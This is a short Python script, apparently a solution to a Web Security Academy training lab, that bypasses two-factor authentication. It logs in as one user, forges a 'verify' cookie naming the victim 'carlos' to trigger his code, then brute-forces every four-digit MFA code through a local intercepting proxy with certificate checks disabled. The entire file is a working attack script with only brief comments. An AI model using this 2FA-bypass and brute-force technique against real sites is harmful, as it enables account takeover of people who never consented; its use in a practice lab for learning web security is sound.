import requests

#to disable ceritifcate warning
requests.packages.urllib3.\
disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

app_url = "https://0a1a003f03a4340b84d80ac200080072.web-security-academy.net"     #application url
proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'} 

#login as wiener and then capture the session cookies

wiener_session = requests.session()
w_data = {'username':'wiener','password':'peter'}
w_res = wiener_session.post(app_url+"/login",verify=False,proxies=proxies,data=w_data)
print("session for wiener is", wiener_session.cookies.get_dict())

#creating carlos session
carlos_session = requests.session()

carlos_session.cookies['session'] = wiener_session.cookies['session']  #copy wiener session value to carlos
carlos_session.cookies.set('verify', 'carlos')       #set value of verify cookie
print("session for carlos is", carlos_session.cookies.get_dict())     

c_res = carlos_session.get(app_url+"/login2",verify=False,proxies=proxies) #send 2fa code for carlos

print("starting to brtuteforce for mfa of carlos")

for i in range(1,9999):
    mfa= f"{i:04}"                                                                      #way to set number like 1 to 0001 or 20 to 0020
    c_data = {'mfa-code':mfa}
    c_res = carlos_session.post(app_url+"/login2",verify=False,proxies=proxies,data=c_data)
    if "Incorrect security code" not in c_res.text:
        print("OTP found for carlos",mfa)
        break